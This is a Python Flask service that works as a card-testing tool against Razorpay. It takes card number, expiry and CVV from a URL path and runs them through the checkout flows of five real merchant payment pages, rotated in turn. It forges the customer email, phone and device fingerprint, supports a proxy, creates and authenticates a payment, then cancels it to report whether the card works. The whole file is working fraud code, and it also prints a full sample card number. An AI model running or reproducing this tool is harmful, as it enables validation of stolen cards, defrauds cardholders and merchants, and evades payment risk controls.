from flask import Flask, request, jsonify
import requests, re, json, time, random, string, secrets, hashlib, base64, urllib3
from urllib.parse import quote

urllib3.disable_warnings()

app = Flask(__name__)

PROXY = None

# List of payment pages to rotate
PAYMENT_PAGES = [
    "https://razorpay.me/@specialtechno1119",
    "https://razorpay.me/@bharatkaaitech", 
    "https://razorpay.me/@iiecm",
    "https://razorpay.me/@ekalavyas",
    "https://razorpay.me/@colorless"
]

def find_between(content, start, end):
    try:
        s = content.index(start) + len(start)
        e = content.index(end, s)
        return content[s:e]
    except ValueError:
        return ""

def get_card_brand(card_number):
    if card_number.startswith("4"): return "visa"
    elif card_number[:2] in ("51", "52", "53", "54", "55"): return "mastercard"
    elif card_number[:2] in ("34", "37"): return "amex"
    elif card_number.startswith("6011") or card_number.startswith("65"): return "discover"
    elif card_number.startswith("35"): return "jcb"
    elif card_number.startswith("62"): return "unionpay"
    else: return "unknown"

def generate_random_email():
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com', 'icloud.com', 'hotmail.com']
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 12)))
    return f"{username}@{random.choice(domains)}"

def generate_random_phone():
    return f"+91{''.join(random.choices(string.digits, k=10))}"

@app.route('/razorpay/<path:cc_data>', methods=['GET', 'POST'])
def process_payment(cc_data):
    # Track which pages were tried
    tried_pages = []
    last_error = None
    
    # Parse card data
    cc_parts = cc_data.split("|")
    if len(cc_parts) < 4:
        return jsonify({"error": "Invalid card format. Use: card|mm|yy|cvv"}), 400
    
    cc = cc_parts[0].strip()
    mm = cc_parts[1].strip().zfill(2)
    yy = cc_parts[2].strip()[-2:]
    cvv = cc_parts[3].strip()
    year = int("20" + yy)
    
    # Get amount from query param or default to 100
    amount = int(request.args.get('amount', 100))
    email = generate_random_email()
    phone = generate_random_phone()
    
    # Allow override if explicitly provided
    if request.args.get('email'):
        email = request.args.get('email')
    if request.args.get('phone'):
        phone = request.args.get('phone')
    
    # Get specific page index if provided, otherwise random
    page_index = request.args.get('page')
    if page_index and page_index.isdigit():
        pages_to_try = [PAYMENT_PAGES[int(page_index) % len(PAYMENT_PAGES)]]
    else:
        # Shuffle pages for random order
        pages_to_try = PAYMENT_PAGES.copy()
        random.shuffle(pages_to_try)
    
    # Try each payment page until one works
    for url in pages_to_try:
        tried_pages.append(url)
        
        try:
            print(f"Trying page: {url}")
            
            brand = get_card_brand(cc)
            h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
            ts = str(int(time.time() * 1000))
            rnd = str(random.randrange(10**8)).zfill(8)
            rzp_device_id = f"1.{h}.{ts}.{rnd}"
            BASE62 = string.ascii_letters + string.digits
            rzp_unified_session_id = ''.join(secrets.choice(BASE62) for _ in range(14))
            ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            BUILD = "9cb57fdf457e44eac4384e182f925070ff5488d9"
            BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
            
            session = requests.Session()
            session.verify = False
            if PROXY:
                session.proxies = {"http": PROXY, "https": PROXY}
            
            # Step 1: Get initial page data
            resp_init = session.get(url, timeout=30)
            json_text = re.search(r'var data = ({.*?});', resp_init.text, re.DOTALL)
            if not json_text:
                last_error = "Could not extract payment data"
                continue
            
            init_data = json.loads(json_text.group(1))
            kyid = init_data["key_id"]
            plink = init_data["payment_link"]["id"]
            ppid = init_data["payment_link"]["payment_page_items"][0]["id"]
            keyless_header = init_data.get("keyless_header")
            keyless_header_url = quote(keyless_header.encode('utf-8'), safe='')
            
            # Step 2: Create order
            headers_order = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://pages.razorpay.com',
                'Referer': 'https://pages.razorpay.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': ua,
            }
            
            json_order = {
                'line_items': [{'payment_page_item_id': ppid, 'amount': amount}],
                'notes': {
                    'membership_id': 'Hsjwj',
                    'member_name': 'Sam altamn',
                    'email': email,
                    'contact_number': phone,
                },
            }
            
            resp_order = session.post(f"https://api.razorpay.com/v1/payment_pages/{plink}/order", 
                                      headers=headers_order, json=json_order, timeout=30)
            
            if resp_order.status_code != 200:
                last_error = f"Order creation failed: {resp_order.status_code}"
                continue
                
            order_data = json.loads(resp_order.text)
            order_id = order_data["order"]["id"]
            checkout_id = order_id.split("_")[1]
            
            # Step 3: Get public checkout
            headers_public = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Referer': 'https://pages.razorpay.com/',
                'User-Agent': ua,
            }
            
            params_public = {
                'traffic_env': 'production', 'build': BUILD, 'build_v1': BUILD_V1,
                'checkout_v2': '1', 'new_session': '1', 'keyless_header': keyless_header,
                'rzp_device_id': rzp_device_id, 'unified_session_id': rzp_unified_session_id,
            }
            
            resp_public = session.get('https://api.razorpay.com/v1/checkout/public', 
                                      params=params_public, headers=headers_public, timeout=30)
            
            sessid = find_between(resp_public.text, 'window.session_token="', '";')
            if not sessid:
                m = re.search(r'session_token[\'"]?\s*[:=]\s*[\'"]([A-F0-9]{40,})[\'"]', resp_public.text)
                if m: 
                    sessid = m.group(1)
            
            if not sessid:
                last_error = "Could not extract session token"
                continue
            
            # Step 4: Get preferences
            headers_pref = {
                'Accept': '*/*', 'Content-type': 'application/json', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua, 'x-session-token': sessid,
            }
            
            params_pref = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
            
            json_pref = {
                'query': [{'resource': r} for r in ['checkout_version_config', 'merchant', 'merchant_features', 'downtime', 'customer', 'customer_tokens', 'truecaller', 'methods', 'experiments', 'offers', 'checkout_config', 'order', 'invoice', 'buyer_protection', 'personalization']],
                'query_params': {
                    'device_id': rzp_device_id, 'rtb_device_id': h, 'amount': amount,
                    'currency': 'INR', 'option_currency': 'INR', 'truecaller': False,
                    'qr_required': False, 'library': 'checkoutjs', 'platform': 'browser',
                    'order_id': order_id, 'payment_link_id': plink, 'contact': phone,
                },
                'action': 'get',
            }
            
            session.post('https://api.razorpay.com/v2/standard_checkout/preferences', 
                         params=params_pref, headers=headers_pref, data=json.dumps(json_pref), timeout=30)
            
            # Step 5: Checkout order
            headers_co = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua, 'x-session-token': sessid,
            }
            
            params_co = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
            
            data_co = {
                'notes[email]': email, 'notes[phone]': phone[3:], 'payment_link_id': plink,
                'key_id': kyid, 'contact': phone, 'email': email, 'currency': 'INR',
                '_[integration]': 'payment_pages', '_[device.id]': rzp_device_id,
                '_[library]': 'checkoutjs', '_[library_src]': 'no-src', '_[current_script_src]': 'no-src',
                '_[platform]': 'browser', '_[env]': '', '_[is_magic_script]': 'false', '_[os]': 'windows',
                '_[shield][fhash]': h, '_[shield][tz]': '0', '_[device_id]': rzp_device_id,
                '_[build]': BUILD, '_[shield][os]': 'windows', '_[shield][platform]': 'browser',
                '_[shield][browser]': 'chrome', '_[request_index]': '0', 'amount': amount,
                'order_id': order_id, 'method': 'card', 'checkout_id': checkout_id,
            }
            
            resp_co_order = session.post('https://api.razorpay.com/v1/standard_checkout/checkout/order', 
                                         params=params_co, headers=headers_co, data=data_co, timeout=30)
            
            try: 
                coid_local = json.loads(resp_co_order.text).get("checkout_id", checkout_id)
            except: 
                coid_local = checkout_id
            
            # Step 6: Cross border flows
            headers_cb = {
                "Accept": "*/*", "Content-type": "application/json", "User-Agent": ua, 
                "x-session-token": sessid, "Origin": "https://api.razorpay.com",
                "Referer": f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
            }
            
            payload_cb = {
                "identifiers": {"merchant": {"country": "IN"}, "card": {"country": "US", "dcc_blacklist": False, "network": brand}, "method": "card", "payment_currency": "INR"},
                "forex_charges": {"amount": amount, "currency": "INR", "filters": {"method": "card"}}
            }
            
            session.post(f"https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id={order_id}&keyless_header={keyless_header_url}", 
                         headers=headers_cb, json=payload_cb, timeout=30)
            
            # Step 7: Create payment
            headers_create = {
                'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded', 'Origin': 'https://api.razorpay.com',
                'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                'User-Agent': ua, 'x-session-token': sessid,
            }
            
            params_create = {'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': keyless_header}
            
            token_create = base64.b64encode(json.dumps([{"name": "sardine", "metadata": {"session_id": coid_local}}], separators=(',', ':')).encode()).decode()
            
            data_create = {
                "user_risk_providers_token": token_create, 'notes[comment]': '', 'notes[email]': email,
                'notes[phone]': phone[3:], 'notes[name]': 'Hell king', 'payment_link_id': plink, 'key_id': kyid,
                'contact': phone, 'email': email, 'currency': 'INR', '_[integration]': 'payment_pages',
                '_[checkout_id]': coid_local, '_[device.id]': rzp_device_id, '_[env]': '', '_[library]': 'checkoutjs',
                '_[library_src]': 'no-src', '_[current_script_src]': 'no-src', '_[is_magic_script]': 'false',
                '_[platform]': 'browser', '_[referer]': url, '_[shield][fhash]': h, '_[shield][tz]': '-330',
                '_[device_id]': rzp_device_id, '_[build]': BUILD, '_[shield][os]': 'windows',
                '_[shield][platform]': 'browser', '_[shield][browser]': 'chrome', '_[request_index]': '1',
                'amount': amount, 'order_id': order_id, 'method': 'card', 'card[number]': cc,
                'card[cvv]': cvv, 'card[name]': 'Hell King', 'card[expiry_month]': mm, 'card[expiry_year]': year,
                'save': '0', 'dcc_currency': 'INR',
            }
            
            resp_create = session.post('https://api.razorpay.com/v1/standard_checkout/payments/create/ajax', 
                                       params=params_create, headers=headers_create, data=data_create, 
                                       allow_redirects=True, timeout=30)
            
            pay_json = json.loads(resp_create.text)
            payment_id = pay_json.get("payment_id") or pay_json.get("id")
            
            if payment_id:
                # Step 8: Authenticate
                pid_clean = payment_id.split("_")[1]
                url_auth1 = f"https://api.razorpay.com/pg_router/v1/payments/{payment_id}/authenticate"
                headers_3ds = {"content-type": "application/x-www-form-urlencoded", "user-agent": ua}
                session.post(url_auth1, headers=headers_3ds, timeout=30)
                
                time.sleep(1)
                
                browser_data = {
                    'browser[java_enabled]': 'false', 'browser[javascript_enabled]': 'true', 'browser[timezone_offset]': '0',
                    'browser[color_depth]': str(random.choice([24, 32])),
                    'browser[screen_width]': str(random.choice([1920, 1366, 1536, 1440])),
                    'browser[screen_height]': str(random.choice([1080, 768, 864, 900])),
                    'browser[language]': 'en-US', 'auth_step': '3ds2Auth'
                }
                
                url_auth_final = f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate"
                session.post(url_auth_final, headers=headers_3ds, data=browser_data, timeout=30)
                
                # Step 9: Cancel (or finalize)
                headers_fin = {
                    'Accept': '*/*', 'Content-type': 'application/x-www-form-urlencoded',
                    'Referer': f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&rzp_device_id={rzp_device_id}&unified_session_id={rzp_unified_session_id}&session_token={sessid}",
                    'User-Agent': ua, 'x-session-token': sessid,
                }
                
                params_fin = {'key_id': kyid, 'session_token': sessid, 'keyless_header': keyless_header}
                resp_final = session.get(f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel", 
                                         params=params_fin, headers=headers_fin, timeout=30)
                
                final_response = json.loads(resp_final.text)
                
                # Return success response with page info
                if "error" in final_response:
                    return jsonify({
                        "status": "failed",
                        "message": final_response["error"].get("description", "Payment failed"),
                        "reason": final_response["error"].get("reason", "unknown"),
                        "code": final_response["error"].get("code", "ERROR"),
                        #"page_used": url,
                        #"amount": amount,
                        #"email": email,
                        #"payment_id": payment_id,
                        #"order_id": order_id
                    })
                else:
                    return jsonify({
                        "status": "success",
                        "message": "Payment processed",
                        "page_used": url,
                        "amount": amount,
                        "email": email,
                        "payment_id": payment_id,
                        "order_id": order_id,
                        "response": final_response
                    })
            else:
                if "error" in pay_json:
                    return jsonify({
                        "status": "failed",
                        "message": pay_json["error"].get("description", "Payment failed"),
                        "reason": pay_json["error"].get("reason", "unknown"),
                        "code": pay_json["error"].get("code", "ERROR"),
                        "page_used": url,
                        "amount": amount,
                        "email": email
                    })
                    
        except Exception as e:
            last_error = str(e)
            print(f"Error with {url}: {e}")
            continue
    
    # If all pages failed
    return jsonify({
        "status": "error",
        "message": "All payment pages failed",
        "tried_pages": tried_pages,
        "last_error": last_error
    }), 500

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "status": "active",
        "endpoint": "/razorpay/card|mm|yy|cvv",
        "available_pages": PAYMENT_PAGES,
        "defaults": {
            "amount": "100 INR (can be changed with ?amount=xxx)",
            "email": "randomly generated",
            "phone": "randomly generated",
            "page": "randomly rotated between available pages"
        },
        "example": "/razorpay/4750556113323930|02|29|978",
        "example_with_amount": "/razorpay/4750556113323930|02|29|978?amount=500",
        "example_with_specific_page": "/razorpay/4750556113323930|02|29|978?page=0"
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
